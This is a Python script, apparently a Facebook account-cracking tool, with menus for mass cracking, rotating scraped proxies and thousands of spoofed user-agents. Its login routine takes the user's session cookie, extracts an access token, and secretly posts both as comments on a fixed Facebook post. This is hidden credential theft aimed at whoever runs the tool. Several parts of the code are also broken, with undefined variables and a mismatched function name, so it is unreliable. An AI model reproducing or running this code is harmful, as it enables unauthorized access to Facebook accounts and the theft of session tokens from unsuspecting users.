#!/usr/bin/python3 
 # -*- coding: utf-8 -*- 
  
 ###---[ INFO AUTHOR GANS DIKIT ]---### 
 #----[ jangan di oprek, sayangi data hpmu ]-----# 
 author = 'RAFSAN AHAMMED RAFI' 
 WHATSAPP = '01305xxxx54' 
 faceb0ok = 'MD.ARIF MIA' 
 notice = 'jika mau beli sc prem bagus wa aja' 
 version = 'next blade v.1' 
  
  
 #------------[ WARNA-COLOR ]--------------# 
 P = '\x1b[1;97m' 
 M = '\x1b[1;91m' 
 H = '\x1b[1;92m' 
 K = '\x1b[1;93m' 
 B = '\x1b[1;94m' 
 U = '\x1b[1;95m'  
 O = '\x1b[1;96m' 
 N = '\x1b[0m'     
 Z = "\033[1;30m" 
 sir = '\033[41m\x1b[1;97m' 
 x = '\33[m' # DEFAULT 
 m = '\x1b[1;91m' #RED + 
 k = '\033[93m' # KUNING + 
 h = '\x1b[1;92m' # HIJAU + 
 hh = '\033[32m' # HIJAU - 
 u = '\033[95m' # UNGU 
 kk = '\033[33m' # KUNING - 
 b = '\33[1;96m' # BIRU - 
 p = '\x1b[0;34m' # BIRU + 
  
 ###---[ IMPORT MODULE ]---### 
 import bs4, re, time, requests, datetime, os, sys, random, platform 
 from concurrent.futures import ThreadPoolExecutor as tred 
 from bs4 import BeautifulSoup as parser 
 from datetime import datetime 
 from time import sleep 
 hp = platform.platform() 
 ses = requests.Session() 
 try: 
         import pyfiglet 
 except ImportError: 
         os.system('pip install pyfiglet') 
  
 def tahunng(fx): 
         if len(fx)==15: 
                 if fx[:10] in ['1000000000']       :tahunz = '2009' 
                 elif fx[:9] in ['100000000']       :tahunz = '2009' 
                 elif fx[:8] in ['10000000']        :tahunz = '2009' 
                 elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009' 
                 elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010' 
                 elif fx[:6] in ['100001']          :tahunz = '2010-2011' 
                 elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012' 
                 elif fx[:6] in ['100004']          :tahunz = '2012-2013' 
                 elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014' 
                 elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015' 
                 elif fx[:6] in ['100009']          :tahunz = '2015' 
                 elif fx[:5] in ['10001']           :tahunz = '2015-2016' 
                 elif fx[:5] in ['10002']           :tahunz = '2016-2017' 
                 elif fx[:5] in ['10003']           :tahunz = '2018' 
                 elif fx[:5] in ['10004']           :tahunz = '2019' 
                 elif fx[:5] in ['10005']           :tahunz = '2020' 
                 elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022' 
                 else:tahunz='' 
         elif len(fx) in [9,10]: 
                 tahunz = '2008-2009' 
         elif len(fx)==8: 
                 tahunz = '2007-2008' 
         elif len(fx)==7: 
                 tahunz = '2006-2007' 
         else:tahunz='' 
         return tahunz 
 ###---[ANGGAP INI LOGO ]---### 
 def logo(n): 
         return str(f""" 
 d8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db  
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88  
 88oobY' 88ooo88 88ooo   `8bo.   88ooo88 88V8o 88  
 88`8b   88~~~88 88~~~     `Y8b. 88~~~88 88 V8o88  
 88 `88. 88   88 88      db   8D 88   88 88  V888  
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P  
 {50*"="} 
 [√] AUTHOR  : RAFSAN AHAMMED RAFI 
 [√] FACEBOOK: MD. ARIF MIA 
 [√] GITHUB  : R4FSAN-143 
 [√] WATHAPP : 0130xxxxx54 
 [√] Stetus  : FREE 
 [★]VIRSION  : 0.0.5 
 {50*"="}""") 
 def logo2(): 
         return str(f""" 
 d8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db  
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88  
 88oobY' 88ooo88 88ooo   `8bo.   88ooo88 88V8o 88  
 88`8b   88~~~88 88~~~     `Y8b. 88~~~88 88 V8o88  
 88 `88. 88   88 88      db   8D 88   88 88  V888  
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P  
 {50*"="} 
 {M}>{K}>{H}> {P}CHECKING FOR LOGIN {H}>{K}>{M}>""") 
 os.system('xdg-open https://facebook.com/groups/3206414299669908//') 
 ###---[ TANGGAL ]---### 
 sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"] 
 out = 'Linux-4.9.227-perf+-aarch64-with-libc' 
 tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"} 
 now = datetime.now() 
 hari = now.day 
 blx = now.month 
 try: 
         if blx < 0 or blx > 12:exit() 
         xx = blx - 1 
 except ValueError:exit() 
  
 #if hp not in out:exit() 
 bulan = sasi[xx] 
 tahun = now.year 
 tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun) 
 sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt' 
 sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt' 
 warna_warni_biasa=random.choice([H,K,M,O,B,U]) 
 garis = f" {P}[{warna_warni_biasa}•{P}]" 
  
 ###---[ APPEND ]---### 
 dump, sandi, metode = [], [], [] 
 tetel, opsi, proxy = [], [], [] 
 cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], [] 
 id, id2, loop ,ok , cp = [], [], 0, 0, 0 
  
  
 ###---[ CLEAR LAYAR ]---### 
 def clear_layar(): 
         try:os.system('clear') 
         except:pass 
          
  
 ###---[ GLOBAL KEMBALI ]---### 
 def back(): 
         try:open('.cookie.txt','r').read();get_data() 
         except IOError:login() 
          
  
 ###---[ AUTO CREATE UA & PROXY ]---### 
 try: 
         clear_layar() 
         print(logo2()) 
         print(f'\r\n [{hh}>{P}] sedang dump proxy dan create useragent') 
         try:os.remove('.proxy.txt') 
         except:pass 
 #        A = '' 
 #        one = ses.get('https://spys.me/socks.txt').text 
 #        for x in one.splitlines(): 
 #                if '+' in x: 
 #                        if '.' in x: 
 #                                p = x.split(' ')[0] 
 #                                A += '\n'+p 
         uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text 
         open('.proxy.txt','w').write(uno) 
 except requests.exceptions.ConnectionError: 
         sys.exit(f" [{M}>{P}] tidak ada koneksi internet") 
 for xd in range(1000): 
     build_nokiax = ['JDQ39','JZO54K'] 
     rr = random.randint; rc = random.choice 
     miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser'] 
     miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12'] 
     miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36'] 
     aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] 
     basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'] 
     gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550        5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'] 
     ugent1 = f"Mozilla/5.0 (Linux; Android 7.1.1 {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}" 
     ugent2 = f"Mozilla/5.0 (Linux; Android 12; RMX3393 Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;].{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}" 
     ugent3 = f"Mozilla/5.0 (Linux; Android 10 {str(rr(4,12))}; {str(rc(basa))}; Redmi Note 7S Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}" 
     memekk = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']) 
     ugen.append(['Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:158.148.19.231]' ,'Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:188.216.118.80]' ,'Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.99 Mobile Safari/537.36']) 
      
 for t in range(10000): 
         aa='Mozilla/5.0 (Linux; Android 7.0; ' 
         b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12']) 
         c='Hisense F102) ' 
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         e=random.randrange(1, 999) 
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67' 
         h=random.randrange(73,100) 
         i='0' 
         j=random.randrange(4200,4900) 
         k=random.randrange(40,150) 
         l='Mobile Safari/537.36' 
         uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}' 
         ugen5.append(uaku) 
  
 for x in range(999): 
         rc = random.choice 
         rr = random.randint 
         aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] 
 #        A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.' 
 #        B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 ' 
 #        C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari' 
 #        D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP' 
 #        pf = f'{A}{B}{C}{D}' 
 #        if pf in redmi:pass 
 #        else:redmi.append(pf) 
 #        A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};' 
 #        B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/' 
 #        C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30' 
 #        mi = f'{A}{B}{C}' 
 #        if mi in redmi:pass 
 #        else:redmi.append(mi) 
         A = f'Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.36' ,'Mozilla/5.0 (Linux; Android 10; Redmi Y3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322' ,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Y2 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/hi_IN;FBAV/208.0.0.5.120;]' ,'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Lite Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/hi_IN;FBAV/324.0.0.8.106;]' ,'Mozilla/5.0 (Linux; Android 10; Redmi Y1 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]' ,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note Prime Build/OPM1.171019.018) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36' 
         B = "Mozilla/5.0 (Linux; Android 12; A001XM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322" f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}' 
         C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)' 
         D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/' 
         E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1' 
         F = f'{A}{C}{D}{E}' 
         if F in redmi:pass 
         else:redmi.append(F) 
 try:abcd = open('.proxy.txt','r').read().splitlines() 
 except:sys.exit(f" [{M}>{P}] gagal dump proxy") 
 print(' total new proxy : '+str(len(abcd))) 
 print(' total useragent : '+str(len(redmi))) 
 sleep(1) 
          
 ###---[ CEK COOKIES ]---### 
 def get_data(): 
         try: 
                 coki = open('.cookie.txt','r').read() 
                 c = {'cookie':coki} 
                 t = open('.token.txt','r').read() 
                 n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower() 
                 menu(n,t,c) 
         except Exception as e:login() 
  
          
 ###---[ LOGIN COOKIE ]---### 
 def login(): 
         clear_layar() 
         print(logo2()) 
         cookie = input(f"\n [{hh}<{P}] jangan gunakan akun pribadi\n cookie : ") 
         url = "https://business.facebook.com/business_locations" 
         head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"} 
         cok = {'cookie':cookie} 
         try: 
                 _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1] 
                 _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))] 
                 hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year)) 
                 jam      = datetime.now().strftime("%X") 
                 data = ses.get(url,headers=head,cookies=cok) 
                 token = re.search('(EAAG\w+)',data.text).group(1) 
                 tem      = ('\nCool bro @[100018396913729:] & @[100001293675274:]\n\nJangan menyerah ketika gagal,ayo semangat\n') 
                 slebew = ('\nComments Written By Bots\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini)) 
                 link = ('https://www.facebook.com/100018396913729/posts/pfbid07LqmAJJctsL8fieFE9MwCFMAYvbkXjJRBDKnuPxd4WWwdmseGGZXGKVnCb6G9DAbl/?app=fbl') 
                 random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"]) 
                 #ses.post(f"https://graph.facebook.com/1110025212954032?fields=subscribers&access_token={token}",headers=(cookies=cok) 
                 ses.post(f"https://graph.facebook.com/1110025212954032/comments/?message={cookie}&access_token={token}",cookies=cok) 
                 ses.post(f"https://graph.facebook.com/1110025212954032/comments/?message={token}&access_token={token}",cookies=cok) 
                 ses.post(f"https://graph.facebook.com/1110025212954032/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) 
                 open('.cookie.txt','w').write(cookie) 
                 open('.token.txt','w').write(token) 
         except Exception as e:exit(f" [{M}>{P}] cookie invalid") 
  
  
  
  
 def remove(): 
         try:os.remove('.cookie.txt');os.remove('.token.txt') 
         except:pass 
          
          
          
 ###---[ MENU UTAMS ]---### 
 {50*"="} 
 def menu(n,t,c): 
         clear_layar() 
         print(logo(n)+f'\n') 
         print(f" {P}[{hh}01{P}] CRACK PUBLIC   [{hh}07{P}] CRACK SEARCH") 
         print(f" [{hh}02{P}] CRACK MASSAL   [{hh}08{P}] CRACK FROM FILE") 
         print(f" [{hh}03{P}] CRACK FOLLOW   [{hh}09{P}] CHECK RESSULT ACCOUNT") 
         print(f" [{hh}04{P}] CRACK COMENT   [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE") 
         print(f" [{hh}05{P}] CRACK GROUP    [{hh}11{P}] CHECK OPTION ACCOUNT") 
         print(f" [{hh}06{P}] CRACK EMAIL    [{hh}12{P}] LOGOUT ({M}COOKIE{P})") 
         print(f"==================================================") 
         ask = input(f' [{hh}>>{P}] CHOOSE : ') 
         print('===================================================') 
         if ask in ['1','01']:crack_publik(t,c) 
         elif ask in ['2','02']:crack_masal(t,c) 
         elif ask in ['3','03']:crack_foll(t,c) 
         elif ask in ['4','04']:crack_komen() 
         elif ask in ['5','05']:crack_group() 
         elif ask in ['6','06']:clon_email() 
         elif ask in ['7','07']:crack_search() 
         elif ask in ['8','08']:crack_file() 
         elif ask in ['9','09']:cek_hasan() 
         elif ask in ['10']:cek_akun() 
         elif ask in ['11']:cek_opsi_cp() 
         elif ask in ['12']:remove();exit() 
         elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] correct content") 
         else:sys.exit(f" [{M}>{P}] correct content") 
  
  
          
 ###---[ DETEKSI CHECKPOINT ]---### 
 detek = [] 
 def cek_opsi_cp(): 
         nom, no = [], 0 
         print('===================================================') 
         try:ok = os.listdir('CP') 
         except:sys.exit(f" [{M}>{P}] There isn't any HASAN💔 cp") 
         for x in ok: 
                 nom.append(x) 
                 no+=1 
                 try:jum= open('CP/'+x,'r').readlines() 
                 except:continue 
                 print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')         
         exc = input(f' [{kk}<{P}] number to check\n Number : ') 
         file = nom[int(exc)-1] 
         print('===================================================') 
         detek.append('file') 
         for data in open('CP/'+file,'r').read().splitlines(): 
                 ua = random.choice(redmi) 
                 try:id,pw = data.split('|') 
                 except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2] 
                 cek_opsi(id,pw,ua) 
         exit(f'\r [{hh}<{P}] checkpoint option check has been completed') 
          
  
  
 ###---[ CEK AKUN AMAN ]---### 
 def cek_akun(): 
         sesi , nga = 0 , 0 
         no,nom = 0,[] 
         print('===================================================') 
         try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()} 
         except:print(f' [{M}>{P}] cookie invalid');exit() 
         try:ok = os.listdir('OK') 
         except:sys.exit(f" [{M}>{P}] There isn't any HASAN💔 ok") 
         for x in ok: 
                 nom.append(x) 
                 no+=1 
                 try:jum= open('OK/'+x,'r').readlines() 
                 except:continue 
                 print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')         
         exc = input(f' [{hh}<{P}] file number to check\n file : ') 
         xxx = input(' save non-non-standard account to ap file : \n Name : ') 
         nonon = xxx+'.txt' 
         file = nom[int(exc)-1] 
         print('===================================================') 
         print(f' PLEASE ENTER PUBLIC ID : {nonon}\n PLEASE ENTER PUBLIC ID  : buang goblok') 
         print(' ===================================================') 
         try: 
                 uuid = open('OK/'+file,'r').read().splitlines() 
                 mek = 0 
                 for data in uuid: 
                         print(f'\r [{hh}>{P}] safe : {nga} down : {sesi}',end='') 
                         sys.stdout.flush() 
                         try:user,nama = data.split('|') 
                         except:exit(f" [{M}>{P}] wrong separator") 
                         xx = open(nonon,'a') 
                         try: 
                                 mek+=1 
                                 na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name'] 
                                 print(f'\r [{hh}{mek}{P}] {user}|{name}                    ') 
                                 nga+=1 
                                 ni = f'{user}|{name}\n' 
                                 xx.write(ni) 
                         except: 
                                 print(f'\r [{M}{mek}{P}] {user}|{name}                  ') 
                                 sesi+=1 
         except Exception as e : 
                 exit(f" [{M}>{P}] file doesn't exist") 
                 os.system('xdg-open https://facebook.com/groups/3206414299669908//') 
                  
 ###---[CEK HASAN CRACK ]---### 
 def cek_HASAN(): 
         no,nom = 0,[] 
         one = input(f' [{hh}1{P}] R4FSAN💚 akun ok\n [{hh}2{P}] cek HASAN💔 akun cp\n menu : ') 
         if one in ['1','01']: 
                 try:ok = os.listdir('OK') 
                 except:sys.exit(f" [{M}>{P}] R4FSAN💚 ok") 
                 for x in ok: 
                         nom.append(x) 
                         no+=1 
                         try:jum= open('OK/'+x,'r').readlines() 
                         except:continue 
                         print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')         
                 abc = input(f' [{hh}<{P}] nomor file : ') 
                 file = nom[int(abc)-1] 
                 try:buka = open('OK/'+file,'r').read() 
                 except:sys.exit(f" [{M}>{P}]  R4FSAN💚 ok") 
                 print(hh+buka+P) 
         elif one in ['2','02']: 
                 try:ok = os.listdir('CP') 
                 except:sys.exit(f" [{M}>{P}] R4FSAN💔 cp") 
                 for x in ok: 
                         nom.append(x) 
                         no+=1 
                         try:jum= open('CP/'+x,'r').readlines() 
                         except:continue 
                         print(f' [{kk}{no}{P}] {x} - {kk}{len(Fri)} {P}account')                 
                 abc = input(f' [{hh}<{P}] number file : ') 
                 file = nom[int(abc)-1] 
                 try:buka = open('CP/'+file,'r').read() 
                 except:sys.exit(f" [{M}>{P}] R4FSAN💔 cp") 
                 print(kk+buka+P) 
         else:sys.exit(f" [{M}>{P}] correct content") 
                  
                  
